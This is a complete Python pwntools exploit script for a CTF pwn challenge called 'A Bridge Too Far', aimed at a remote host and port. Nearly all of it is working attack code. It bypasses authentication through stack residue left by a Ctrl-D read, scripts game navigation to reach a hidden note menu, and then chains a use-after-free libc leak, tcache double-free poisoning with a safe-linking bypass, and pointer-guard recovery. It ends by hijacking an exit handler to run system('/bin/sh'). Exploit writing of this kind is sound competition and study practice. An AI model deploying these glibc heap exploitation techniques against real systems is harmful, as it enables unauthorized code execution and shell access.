#!/usr/bin/env python
"""Complete exploit for "A Bridge Too Far" (ISCC CTF PWN, 150pt).

Exploit chain:
  Phase 1: PTY stack residue auth bypass → login as "pl1"
  Phase 2: Game navigation → Data Reef → superadmin → moon → note menu
  Phase 3: UAF heap exploit → tcache poison → exit handler → system("/bin/sh")

Binary:  amd64 PIE, Full RELRO, Canary, NX, FORTIFY, SHSTK, IBT
Libc:   Ubuntu GLIBC 2.39-0ubuntu8.7
"""

from pwn import *
import time
import struct

# ============================================================
# Configuration
# ============================================================
context.arch = 'amd64'
context.log_level = 'info'

LOCAL = False       # Set True for local testing
HOST = '39.96.193.120'
PORT = 9999

BASE = '/mnt/c/Users/寸泓/Desktop/ctf/pwn/pwnlei2'

libc = ELF(f'{BASE}/package/libc.so.6', checksec=False)

# ---- Verified offsets for Ubuntu GLIBC 2.39-0ubuntu8.7 ----
UNSORTED_OFF      = 0x203B20   # main_arena + 0x60 (unsorted bin head)
EXIT_FUNCS_OFF    = 0x203680   # __exit_funcs pointer (→ &initial)
EXIT_NODE_OFF     = 0x204FC0   # initial exit_function_list
# libstdc++ offsets used to compute pointer_guard
EXIT_ENTRY1_DSO   = 0x279100
EXIT_ENTRY1_FUNC  = 0xB8DA0

SYSTEM_OFF = libc.sym['system']
BINSH_OFF  = next(libc.search(b'/bin/sh'))

# ============================================================
# Primitives: safe-linking, pointer mangling
# ============================================================
def rol64(x, r):
    return ((x << r) | (x >> (64 - r))) & 0xFFFFFFFFFFFFFFFF

def ror64(x, r):
    return ((x >> r) | (x << (64 - r))) & 0xFFFFFFFFFFFFFFFF

def demangle(enc):
    """Decode safe-linking fd pointer (glibc 2.39)."""
    x = enc
    for _ in range(6):
        x = enc ^ (x >> 12)
    return x


# ============================================================
# Phase 1: Auth Bypass via PTY Stack Residue
# ============================================================
def phase1_auth_bypass(io):
    """
    Stack residue exploit for login bypass.

    Program init generates 31-byte random passwords for 'test' and 'pl1'
    into a stack buffer at [rsp+0x90].  Sending Ctrl-D at a password
    prompt causes read() to return 0 bytes, leaving the stack buffer
    untouched → pl1's original password is still there when we login.

    Steps:
      1. At startup prompt: username='hacker', password=Ctrl-D
      2. At menu: login, username='pl1', password=Ctrl-D
      3. Since buffer still holds pl1's real password → login success
    """
    log.info('=== Phase 1: Auth Bypass ===')

    # Step 1 — startup forced registration
    io.recvuntil(b':')
    io.sendline(b'hacker')
    log.info('Startup username: hacker')

    io.recvuntil(b':')
    time.sleep(0.1)
    io.send(b'\x04')           # Ctrl-D → read() returns 0
    log.info('Startup password: Ctrl-D (preserves stack residue)')
    time.sleep(0.3)

    io.recvuntil(b'5.')         # wait for main menu

    # Step 2 — login as pl1
    io.sendline(b'1')
    io.recvuntil(b':')
    io.sendline(b'pl1')
    log.info('Login username: pl1')

    io.recvuntil(b':')
    time.sleep(0.1)
    io.send(b'\x04')           # Ctrl-D → read()=0 → buffer unchanged
    log.info('Login password: Ctrl-D')
    time.sleep(0.5)

    data = io.recv(timeout=2)
    if b'\xe7\x99\xbb\xe5\xbd\x95\xe6\x88\x90\xe5\x8a\x9f' in data:
        log.success('Phase 1: Login SUCCESS')
    else:
        log.warning(f'Phase 1: unexpected response: {data[:200]}')

    # Enter game
    io.recvuntil(b'5.')
    io.sendline(b'2')           # 开始游戏
    time.sleep(0.5)
    return True


# ============================================================
# Phase 2: Game Navigation → Moon → Note Menu
# ============================================================
class GameNav:
    """
    Island exploration game navigation.

    Key islands & events:
      Data Reef (idx 14)  — Event 7 → sets moon.visible = 1
      superadmin          — hidden island, Event 8 → free bridge terminal
      moon (idx 63)       — triggers hidden note menu on arrival

    Strategy:
      1. Visit Data Reef → unlock moon visibility
      2. Legend-search "superadmin" → create hidden island
      3. Build + move to superadmin → trigger Event 8
      4. In Event 8 free-bridge prompt, enter "月球" as target
      5. Free bridge to moon built → move to moon → note menu
    """

    def __init__(self, io):
        self.io = io

    # -- low-level helpers --
    def _send(self, s):
        if isinstance(s, str): s = s.encode()
        self.io.sendline(s)

    def _recv(self, timeout=2):
        time.sleep(timeout)
        try: return self.io.recv(timeout=1)
        except: return b''

    def cancel(self):
        self.io.sendline(b'0'); time.sleep(0.3); self._recv(0.3)

    # -- game menu wrappers --
    def get_mats(self):
        self.cancel()
        self.io.sendline(b'6'); time.sleep(1)
        data = self._recv(0.5)
        m = re.search(rb'\xe6\x9d\x90\xe6\x96\x99:\s*(\d+)', data)
        self.cancel()
        return int(m.group(1)) if m else 0

    def get_build_list(self):
        self.cancel()
        self.io.sendline(b'2'); time.sleep(1.5)
        data = self._recv(0.5)
        bl = []
        for m in re.finditer(rb'(\d+)\.\s+(.+?)\s+\(\xe6\xb6\x88\xe8\x80\x97:\s*(\d+)\)', data):
            bl.append((int(m.group(1)), m.group(2).decode('utf-8', errors='replace'), int(m.group(3))))
        self.cancel()
        return bl

    def get_move_list(self):
        self.cancel()
        self.io.sendline(b'1'); time.sleep(1.5)
        data = self._recv(0.5)
        ml = []
        for m in re.finditer(rb'(\d+)\.\s+(.+?)\s+\(\xe8\xb7\x9d\xe7\xa6\xbb:\s*(\d+)', data):
            ml.append((int(m.group(1)), m.group(2).decode('utf-8', errors='replace'), int(m.group(3))))
        self.cancel()
        return ml

    def build_bridge(self, num):
        self.io.sendline(b'2'); time.sleep(0.5); self._recv(0.3)
        self.io.sendline(str(num).encode()); time.sleep(2)
        return self._recv(0.5)

    def move_to(self, num):
        self.io.sendline(b'1'); time.sleep(0.5); self._recv(0.3)
        self.io.sendline(str(num).encode()); time.sleep(3)
        return self._recv(1)

    def legend_search(self, name):
        """Option 5 (探索) → 2 (根据传说搜寻) → island name."""
        self.cancel()
        self.io.sendline(b'5'); time.sleep(1.5); self._recv(0.5)
        self.io.sendline(b'2'); time.sleep(1.5); self._recv(0.5)
        if isinstance(name, str): name = name.encode()
        self.io.sendline(name); time.sleep(3)
        return self._recv(1)

    # -- main navigation --
    def execute(self):
        log.info('=== Phase 2: Game Navigation ===')
        time.sleep(1); self._recv(1)
        mats = self.get_mats()
        log.info(f'Starting materials: {mats}')

        # --- Step 1: visit Data Reef (Event 7 → moon.visible=1) ---
        log.info('Step 1: Locating Data Reef...')
        bl = self.get_build_list()
        dr = next((b for b in bl if 'Data Reef' in b[1] or '\xe6\x95\xb0\xe6\x8d\xae' in b[1]), None)
        if not dr:
            # farm the cheapest bridge to reveal more islands
            for _ in range(8):
                bl = self.get_build_list()
                cheap = sorted([b for b in bl if b[2] <= self.get_mats()], key=lambda x: x[2])
                if not cheap: break
                b = cheap[0]
                self.build_bridge(b[0])
                ml = self.get_move_list()
                mv = next((x for x in ml if x[1] == b[1]), None)
                if mv: self.move_to(mv[0])
                dr = next((x for x in self.get_build_list() if 'Data Reef' in x[1] or '\xe6\x95\xb0\xe6\x8d\xae' in x[1]), None)
                if dr: break

        if dr:
            log.info(f'Data Reef #{dr[0]} cost={dr[2]} mats={self.get_mats()}')
            if dr[2] <= self.get_mats():
                self.build_bridge(dr[0])
                ml = self.get_move_list()
                dr_mv = next((b for b in ml if 'Data Reef' in b[1] or '\xe6\x95\xb0\xe6\x8d\xae' in b[1]), None)
                if dr_mv:
                    result = self.move_to(dr_mv[0])
                    log.info(f'Data Reef arrival: {result[:300]}')
                    if b'\xe8\xa7\xa3\xe9\x94\x81' in result or b'\xe6\x9c\x88' in result:
                        log.success('Event 7 triggered — moon unlocked!')

        # --- Step 2: legend-search superadmin ---
        log.info('Step 2: Legend-search superadmin...')
        result = self.legend_search('superadmin')
        log.info(f'Result: {result[:300]}')
        if b'\xe8\xa7\xa3\xe9\x94\x81' in result or b'\xe5\x9d\x90\xe6\xa0\x87' in result:
            log.success('superadmin created!')

        # --- Step 3: navigate to superadmin ---
        log.info('Step 3: Navigate to superadmin...')
        bl = self.get_build_list()
        sa = next((b for b in bl if 'superadmin' in b[1].lower()), None)
        if not sa:
            log.warning('superadmin not in build list')
            return False

        mats = self.get_mats()
        log.info(f'superadmin #{sa[0]} cost={sa[2]} mats={mats}')

        # farm mats if short
        while mats < sa[2]:
            bl = self.get_build_list()
            cheap = sorted(
                [b for b in bl if 'superadmin' not in b[1].lower() and b[2] < mats],
                key=lambda x: x[2],
            )
            if not cheap: break
            b = cheap[0]
            self.build_bridge(b[0])
            ml = self.get_move_list()
            mv = next((x for x in ml if x[1] == b[1]), None)
            if mv: self.move_to(mv[0])
            mats = self.get_mats()
            log.info(f'Farmed → mats={mats}')

        if mats < sa[2]:
            log.warning(f'Still short: {mats} < {sa[2]}')
            return False

        self.build_bridge(sa[0])
        ml = self.get_move_list()
        sa_mv = next((b for b in ml if 'superadmin' in b[1].lower()), None)
        if not sa_mv:
            log.warning('superadmin not in move list after build')
            return False

        result = self.move_to(sa_mv[0])
        log.info(f'Arrived at superadmin: {result[:400]}')

        # --- Step 4: Event 8 — free bridge to moon ---
        log.info('Step 4: Triggering Event 8...')
        self.cancel()
        self.io.sendline(b'5'); time.sleep(3)
        result = self._recv(1)
        log.info(f'Explore superadmin: {result[:500]}')

        # Event 8 prompts for target island name
        prompt_kw = [b'\xe7\x9b\xae\xe6\xa0\x87', b'\xe5\xb2\x9b\xe5\xb1\xbf\xe5\x90\x8d',
                     b'\xe8\xaf\xb7\xe9\x80\x89\xe6\x8b\xa9', b'\xe8\xbe\x93\xe5\x85\xa5']
        if any(kw in result for kw in prompt_kw):
            log.info('Event 8 prompt — sending "月球"')
            self.io.sendline('月球'.encode())  # 月球
            time.sleep(3)
            result = self._recv(1)
            log.info(f'After Event 8: {result[:400]}')

        # --- Step 5: move to moon ---
        log.info('Step 5: Moving to moon...')
        ml = self.get_move_list()
        moon_mv = next((b for b in ml if '\xe6\x9c\x88' in b[1] or 'moon' in b[1].lower()), None)
        if moon_mv:
            log.info(f'Moon in move list: #{moon_mv[0]} dist={moon_mv[2]}')
            result = self.move_to(moon_mv[0])
            log.info(f'Moon arrival: {result[:500]}')
            if b'note' in result.lower() or b'add' in result.lower():
                log.success('>>> NOTE MENU TRIGGERED! <<<')
                return True

        # fallback: check build list for moon
        bl = self.get_build_list()
        moon_bl = next((b for b in bl if '\xe6\x9c\x88' in b[1] or 'moon' in b[1].lower()), None)
        if moon_bl and moon_bl[2] <= self.get_mats():
            self.build_bridge(moon_bl[0])
            ml = self.get_move_list()
            moon_mv = next((b for b in ml if '\xe6\x9c\x88' in b[1] or 'moon' in b[1].lower()), None)
            if moon_mv:
                result = self.move_to(moon_mv[0])
                log.info(f'Moon arrival (fallback): {result[:500]}')
                if b'note' in result.lower() or b'add' in result.lower():
                    log.success('>>> NOTE MENU TRIGGERED! <<<')
                    return True

        return False


# ============================================================
# Phase 3: Heap Exploit — UAF → tcache poison → exit handler
# ============================================================
class NoteExploit:
    """
    Hidden note-menu exploit.

    Menu:
      1. add note    → malloc + read content
      2. delete note → free WITHOUT clearing slot pointer → UAF
      3. view note   → write(slot→data) → leak
      4. edit note   → read into slot→data → use-after-write

    Attack:
      a. Unsorted-bin leak  → libc base
      b. Tcache dup (clear key → double-free) + safe-linking bypass
      c. Read exit_function_list entry1 → compute pointer_guard
      d. Overwrite exit entry → rol(system ^ guard, 17) → system("/bin/sh")
      e. Send invalid menu choice → exit() → our handler fires
    """

    def __init__(self, io):
        self.io = io
        self.sizes = {}

    # -- note menu primitives --
    def _menu(self, c):
        self.io.sendline(str(c).encode())

    def add(self, idx, size):
        self._menu(1)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(b'size: ')
        self.io.sendline(str(size).encode())
        self.sizes[idx] = size
        time.sleep(0.2)

    def delete(self, idx):
        self._menu(2)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        time.sleep(0.2)

    def view(self, idx):
        self._menu(3)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        size = self.sizes.get(idx, 0x20)
        return self.io.recvn(size)

    def edit(self, idx, data):
        self._menu(4)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        time.sleep(0.1)
        self.io.send(data)
        time.sleep(0.2)

    # -- exploit steps --
    def leak_libc(self):
        """Free 0x500 chunk into unsorted bin → read main_arena ptr."""
        log.info('--- libc leak ---')
        self.add(0, 0x500)     # large chunk
        self.add(15, 0x20)     # guard (prevent top consolidation)
        self.delete(0)
        leak = u64(self.view(0)[:8])
        libc_base = leak - UNSORTED_OFF
        log.info(f'unsorted leak: {hex(leak)}')
        log.info(f'libc base:     {hex(libc_base)}')
        return libc_base

    def tcache_poison(self, base_idx, target, size=0x20):
        """
        Double-free tcache dup with safe-linking bypass.
        Returns (slot_of_target_chunk, chunk_b_user_addr).
        """
        a, b = base_idx, base_idx + 1
        c, d = base_idx + 2, base_idx + 3
        e, f = base_idx + 4, base_idx + 5

        self.add(a, size)
        self.add(b, size)

        # tcache: b → a
        self.delete(a)
        self.delete(b)

        # leak safe-linked fd from b → decode → chunk_a address
        chunk_a = demangle(u64(self.view(b)[:8]))
        chunk_b = chunk_a + size + 0x10
        log.info(f'  chunk_a: {hex(chunk_a)}  chunk_b: {hex(chunk_b)}')

        # clear tcache key at offset 8, then double-free b
        self.edit(b, b'B' * 8 + p64(0) + b'C' * (size - 16))
        self.delete(b)                       # tcache: b → b → a …

        self.add(c, size)                    # → b
        self.add(d, size)                    # → b (again!)

        self.delete(c)                       # tcache: c → b → b → …

        # poison fd: point b's fd to target
        poisoned = target ^ (chunk_b >> 12)
        self.edit(d, p64(poisoned) + p64(0) + b'D' * (size - 16))

        self.add(e, size)                    # → whatever tcache gives
        self.add(f, size)                    # → TARGET
        self.sizes[f] = size
        return f, chunk_b

    def execute(self, libc_base):
        log.info('=== Phase 3: Heap Exploit ===')
        node = libc_base + EXIT_NODE_OFF

        # ---- Step 1: read exit entry1 → compute pointer_guard ----
        log.info('Step 1: leaking pointer_guard from exit entry1')
        # allocate at node+0x20 so tcache_get clears entry0.dso (not count!)
        slot_r, _ = self.tcache_poison(1, node + 0x20, size=0x30)
        raw = self.view(slot_r)
        (e0_arg, e0_dso, e1_flavor, e1_enc, e1_arg, e1_dso) = \
            struct.unpack('<QQQQQQ', raw[:0x30])

        log.info(f'  entry1 enc: {hex(e1_enc)}  entry1 dso: {hex(e1_dso)}')

        libstdc_base = e1_dso - EXIT_ENTRY1_DSO
        ptr_guard = ror64(e1_enc, 17) ^ (libstdc_base + EXIT_ENTRY1_FUNC)
        log.info(f'  libstdc++ base: {hex(libstdc_base)}')
        log.info(f'  pointer_guard:  {hex(ptr_guard)}')

        # ---- Step 2: overwrite exit entry12 → system("/bin/sh") ----
        log.info('Step 2: overwriting exit handler entry')
        entry12 = node + 0x190
        slot_w, _ = self.tcache_poison(7, entry12, size=0x20)

        system_addr = libc_base + SYSTEM_OFF
        binsh_addr  = libc_base + BINSH_OFF
        encoded = rol64(system_addr ^ ptr_guard, 17)

        payload = flat(
            4,              # flavor: ef_cxa
            encoded,        # mangled system address
            binsh_addr,     # arg → "/bin/sh"
            0,              # dso (unused)
            word_size=64,
        )
        self.edit(slot_w, payload)
        log.success(f'Exit entry overwritten: system({hex(binsh_addr)}) → "/bin/sh"')

        # ---- Step 3: trigger exit ----
        log.info('Step 3: triggering exit via invalid menu choice')
        self._menu(9)       # invalid → exit()
        time.sleep(0.5)
        log.success('Shell should appear below:')


# ============================================================
# Main entry point
# ============================================================
def start():
    if LOCAL:
        ld = f'{BASE}/package/ld-linux-x86-64.so.2'
        return process(
            [ld, '--library-path', f'{BASE}/package', f'{BASE}/package/pwn'],
            stdin=PTY, stdout=PTY, stderr=PTY,
        )
    else:
        return remote(HOST, PORT)

def main():
    io = start()

    # Phase 1 — login bypass
    phase1_auth_bypass(io)

    # Phase 2 — game navigation → note menu
    nav = GameNav(io)
    reached = nav.execute()
    if not reached:
        log.warning('Phase 2 may have failed — trying Phase 3 anyway')

    # consume any pending output
    time.sleep(1)
    try:
        data = io.recv(timeout=2)
        log.info(f'Pre-note buffer: {data[:300]}')
    except:
        pass

    # Phase 3 — heap exploit
    exp = NoteExploit(io)
    libc_base = exp.leak_libc()
    exp.execute(libc_base)

    io.interactive()

if __name__ == '__main__':
    main()
